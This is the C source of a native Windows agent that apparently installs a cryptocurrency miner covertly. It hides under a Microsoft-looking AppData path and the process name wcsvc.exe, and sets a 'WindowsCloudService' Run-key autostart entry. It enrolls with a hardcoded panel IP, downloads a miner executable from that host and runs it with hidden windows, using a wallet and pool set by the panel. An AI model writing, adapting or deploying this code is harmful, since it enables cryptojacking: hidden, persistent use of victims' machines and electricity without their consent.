/* fleet_agent.c - native Windows agent. No scripts, no droppers, no embedded payload.
 * One small exe: enrolls, heartbeats, downloads the miner bundle once, supervises it.
 * Build: x86_64-w64-mingw32-gcc -o wcsvc.exe fleet_agent.c -lwinhttp -lshell32 -ladvapi32 -lole32 -mwindows -s -Os
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <shellapi.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdarg.h>

#define PANEL_HOST  L"136.108.205.39"
#define PANEL_PORT  80
#define ENROLL_KEY  "Zk2U6-sUtONm-pyXXJ5SrQ"
#define BUNDLE_VER  "krig-1.5.12"

static wchar_t g_dir[MAX_PATH];      /* install dir */
static wchar_t g_log[MAX_PATH];      /* agent log */
static char    g_token[128];
static char    g_worker[128];
static char    g_wallet[256];
static char    g_pool[128];
static int     g_restartSeq = 0;
static int     g_minerEnabled = 1;

/* ---------------- logging ---------------- */
static void logf_(const char *fmt, ...) {
    FILE *f = _wfopen(g_log, L"a");
    if (!f) return;
    SYSTEMTIME st; GetLocalTime(&st);
    fprintf(f, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
    va_list ap; va_start(ap, fmt); vfprintf(f, fmt, ap); va_end(ap);
    fprintf(f, "\n"); fclose(f);
}

/* ---------------- http ---------------- */
static int http_request(const wchar_t *method, const wchar_t *path,
                        const char *body, const char *token,
                        char **out, DWORD *outLen) {
    HINTERNET s = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return 0;
    HINTERNET c = WinHttpConnect(s, PANEL_HOST, PANEL_PORT, 0);
    if (!c) { WinHttpCloseHandle(s); return 0; }

    HINTERNET r = WinHttpOpenRequest(c, method, path, NULL, WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return 0; }

    wchar_t hdr[1024];
    if (token) _snwprintf(hdr, 1024, L"Content-Type: application/json\r\nAuthorization: Bearer %hs\r\n", token);
    else       _snwprintf(hdr, 1024, L"Content-Type: application/json\r\n");
    DWORD blen = body ? (DWORD)strlen(body) : 0;
    WinHttpSendRequest(r, hdr, (DWORD)-1L, (LPVOID)body, blen, blen, 0);
    WinHttpReceiveResponse(r, NULL);

    DWORD code = 0, sz = sizeof(code);
    WinHttpQueryHeaders(r, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &code, &sz, WINHTTP_NO_HEADER_INDEX);

    DWORD total = 0, got = 0;
    char *buf = NULL;
    do {
        if (!WinHttpQueryDataAvailable(r, &got) || !got) break;
        char *nb = realloc(buf, total + got + 1);
        if (!nb) break;
        buf = nb;
        DWORD rd = 0;
        WinHttpReadData(r, buf + total, got, &rd);
        total += rd;
    } while (got);
    if (buf) buf[total] = 0;

    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);

    if (out) { *out = buf; } else { free(buf); }
    if (outLen) *outLen = total;
    return (int)code;
}

/* minimal JSON helpers */
static const char *json_str(const char *js, const char *key, char *dst, int cap) {
    char pat[64]; _snprintf(pat, 64, "\"%s\"", key);
    const char *p = strstr(js, pat);
    if (!p) return NULL;
    p = strchr(p + strlen(pat), ':');
    if (!p) return NULL;
    p++;
    while (*p == ' ' || *p == '"') p++;
    int i = 0;
    while (*p && *p != '"' && *p != ',' && *p != '}' && i < cap-1) dst[i++] = *p++;
    dst[i] = 0;
    return dst;
}
static long json_num(const char *js, const char *key, long dflt) {
    char pat[64]; _snprintf(pat, 64, "\"%s\"", key);
    const char *p = strstr(js, pat);
    if (!p) return dflt;
    p = strchr(p + strlen(pat), ':');
    if (!p) return dflt;
    p++;
    while (*p == ' ') p++;
    if (!strncmp(p, "true", 4)) return 1;
    if (!strncmp(p, "false", 5)) return 0;
    if (!strncmp(p, "null", 4)) return dflt;
    return strtol(p, NULL, 10);
}

/* ---------------- processes ---------------- */
static int proc_running(const wchar_t *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = {sizeof(pe)};
    int found = 0;
    if (Process32FirstW(snap, &pe)) {
        do { if (!lstrcmpiW(pe.szExeFile, name)) { found = 1; break; } }
        while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}
static void proc_kill(const wchar_t *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = {sizeof(pe)};
    if (Process32FirstW(snap, &pe)) {
        do {
            if (!lstrcmpiW(pe.szExeFile, name)) {
                HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (h) { TerminateProcess(h, 0); CloseHandle(h); }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
}

/* ---------------- miner ---------------- */
static void miner_start(void) {
    if (!g_wallet[0] || !g_minerEnabled) return;
    wchar_t exe[MAX_PATH], dir[MAX_PATH], args[1024];
    _snwprintf(exe, MAX_PATH, L"%s\\miner\\krig-miner.exe", g_dir);
    _snwprintf(dir, MAX_PATH, L"%s\\miner", g_dir);
    if (GetFileAttributesW(exe) == INVALID_FILE_ATTRIBUTES) { logf_("miner missing"); return; }

    char url[256];
    if (strstr(g_pool, "://")) _snprintf(url, 256, "%s", g_pool);
    else _snprintf(url, 256, "stratum+ssl://%s", g_pool[0] ? g_pool : "prl.kryptex.network:7048");
    wchar_t wurl[256], wuser[512];
    MultiByteToWideChar(CP_UTF8, 0, url, -1, wurl, 256);
    char user[512];
    _snprintf(user, 512, "%s/%s", g_wallet, g_worker);
    MultiByteToWideChar(CP_UTF8, 0, user, -1, wuser, 512);

    _snwprintf(args, 1024, L"\"%s\" --url \"%s\" --user \"%s\"", exe, wurl, wuser);

    wchar_t logp[MAX_PATH], errp[MAX_PATH];
    _snwprintf(logp, MAX_PATH, L"%s\\logs\\wcsvc-rt.log", g_dir);
    _snwprintf(errp, MAX_PATH, L"%s\\logs\\wcsvc-rt.err", g_dir);
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE ho = CreateFileW(logp, GENERIC_WRITE, FILE_SHARE_READ, &sa,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE he = CreateFileW(errp, GENERIC_WRITE, FILE_SHARE_READ, &sa,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    STARTUPINFOW si = {sizeof(si)};
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = ho; si.hStdError = he;
    PROCESS_INFORMATION pi;
    if (CreateProcessW(NULL, args, NULL, NULL, TRUE,
                       CREATE_NO_WINDOW, NULL, dir, &si, &pi)) {
        logf_("miner started pid=%lu url=%s", pi.dwProcessId, url);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    } else logf_("miner start failed err=%lu", GetLastError());
    if (ho != INVALID_HANDLE_VALUE) CloseHandle(ho);
    if (he != INVALID_HANDLE_VALUE) CloseHandle(he);
}

/* ---------------- miner binary ---------------- */
static void ensure_bundle(void) {
    wchar_t exe[MAX_PATH], mdir[MAX_PATH];
    _snwprintf(mdir, MAX_PATH, L"%s\\miner", g_dir);
    _snwprintf(exe, MAX_PATH, L"%s\\krig-miner.exe", mdir);
    if (GetFileAttributesW(exe) != INVALID_FILE_ATTRIBUTES) return;
    CreateDirectoryW(mdir, NULL);

    char *data = NULL; DWORD len = 0;
    int code = http_request(L"GET", L"/download/miner.exe", NULL, NULL, &data, &len);
    logf_("miner download: http %d, %lu bytes", code, len);
    if (code == 200 && data && len > 1000000) {
        FILE *f = _wfopen(exe, L"wb");
        if (f) { fwrite(data, 1, len, f); fclose(f); }
    }
    free(data);
    logf_("miner ready: %d", GetFileAttributesW(exe) != INVALID_FILE_ATTRIBUTES);
}

/* ---------------- panel calls ---------------- */
static int enroll(void) {
    char body[512], *resp = NULL; DWORD len = 0;
    _snprintf(body, 512,
        "{\"enroll_key\":\"%s\",\"name\":\"%s\",\"machine_id\":\"%s\",\"os\":\"Windows\",\"agent_version\":\"3.0\"}",
        ENROLL_KEY, g_worker, g_worker);
    int code = http_request(L"POST", L"/api/rig/enroll", body, NULL, &resp, &len);
    logf_("enroll http %d", code);
    if (code == 200 && resp) {
        json_str(resp, "token", g_token, 128);
        logf_("enrolled (token %d chars)", (int)strlen(g_token));
        free(resp);
        return g_token[0] ? 1 : 0;
    }
    free(resp);
    return 0;
}

static void heartbeat(void) {
    char body[4096];
    int running = proc_running(L"krig-miner.exe");
    _snprintf(body, 4096,
        "{\"name\":\"%s\",\"machine_id\":\"%s\",\"os\":\"Windows\","
        "\"agent_version\":\"3.0\",\"engine\":\"krig\",\"gpus\":[],"
        "\"miner\":{\"version\":\"%s\",\"state\":\"%s\"},"
        "\"hashrate_ths\":{\"combined\":null,\"per_gpu\":{}},"
        "\"shares\":{\"accepted_user\":0,\"accepted_dev\":0,\"rejected\":0},"
        "\"selected_pool\":\"%s\"}",
        g_worker, g_worker, BUNDLE_VER, running ? "running" : "stopped", g_pool);

    char *resp = NULL; DWORD len = 0;
    int code = http_request(L"POST", L"/api/rig/heartbeat", body, g_token, &resp, &len);
    if (code == 401) { logf_("401 -> re-enroll"); g_token[0] = 0; free(resp); enroll(); return; }
    if (code != 200 || !resp) { logf_("heartbeat http %d", code); free(resp); return; }

    char tmp[256];
    if (json_str(resp, "wallet", tmp, 256)) strncpy(g_wallet, tmp, 255);
    logf_("cfg wallet=%.12s pool=%s enabled=%d", g_wallet, g_pool, g_minerEnabled);
    if (json_str(resp, "pool", tmp, 256))   strncpy(g_pool, tmp, 127);
    g_minerEnabled = (int)json_num(resp, "miner_enabled", 1);
    long rs = json_num(resp, "restart_seq", 0);
    if (rs != g_restartSeq) { g_restartSeq = (int)rs; logf_("restart_seq=%ld", rs); }
    free(resp);

    if (strstr(g_pool, "auto") || !g_pool[0]) strncpy(g_pool, "prl.kryptex.network:7048", 127);

    ensure_bundle();
    if (g_minerEnabled && !proc_running(L"krig-miner.exe")) miner_start();
}

/* ---------------- install / run ---------------- */
static void agent_loop(void) {
    ensure_bundle();
    for (;;) {
        if (!g_token[0]) { if (!enroll()) { Sleep(15000); continue; } }
        heartbeat();
        Sleep(30000);
    }
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmdline, int show) {
    wchar_t lad[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, lad);
    _snwprintf(g_dir, MAX_PATH, L"%s\\Microsoft\\Windows\\wcsvc", lad);
    _snwprintf(g_log, MAX_PATH, L"%s\\logs\\wcsvc.log", g_dir);

    SHCreateDirectoryExW(NULL, g_dir, NULL);
    wchar_t logs[MAX_PATH]; _snwprintf(logs, MAX_PATH, L"%s\\logs", g_dir);
    CreateDirectoryW(logs, NULL);

    DWORD n = GetEnvironmentVariableA("COMPUTERNAME", g_worker, 128);
    if (!n) strcpy(g_worker, "rig");
    strncpy(g_pool, "prl.kryptex.network:7048", 127);

    logf_("=== boot (native agent) ===");

    /* already told to run headless? */
    if (cmdline && strstr(cmdline, "--run")) { agent_loop(); return 0; }

    /* ---------- install ---------- */
    HKEY key;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
        KEY_SET_VALUE, &key) == ERROR_SUCCESS) {
        wchar_t self[MAX_PATH], line[MAX_PATH + 32];
        GetModuleFileNameW(NULL, self, MAX_PATH);
        _snwprintf(line, MAX_PATH + 32, L"\"%s\" --run", self);
        RegSetValueExW(key, L"WindowsCloudService", 0, REG_SZ,
                       (BYTE*)line, (DWORD)((wcslen(line)+1)*2));
        RegCloseKey(key);
        logf_("autostart set");
    }
    logf_("=== install done, launching ===");

    wchar_t self[MAX_PATH], line[MAX_PATH + 32];
    GetModuleFileNameW(NULL, self, MAX_PATH);
    _snwprintf(line, MAX_PATH + 32, L"\"%s\" --run", self);
    STARTUPINFOW si = {sizeof(si)}; PROCESS_INFORMATION pi;
    if (CreateProcessW(NULL, line, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, g_dir, &si, &pi)) {
        logf_("agent started pid=%lu", pi.dwProcessId);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
    return 0;
}
